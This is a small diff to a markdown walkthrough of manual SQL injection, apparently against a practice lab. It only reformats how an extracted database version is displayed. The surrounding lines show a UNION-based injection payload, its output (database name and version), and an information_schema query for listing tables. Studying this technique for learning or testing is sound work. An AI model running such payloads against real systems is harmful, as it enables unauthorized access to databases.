@@ -121,8 +121,7 @@ Payload - **?id=-99' union select 1,database(), version() --+**
 ![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%207.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Capture%207.png)
 
      Database - security 
-
-Version - 5.1.73
+     Version - 5.1.73
 
 9. **select table_name from information_schema.tables;** - used to retrieve table from another database
 
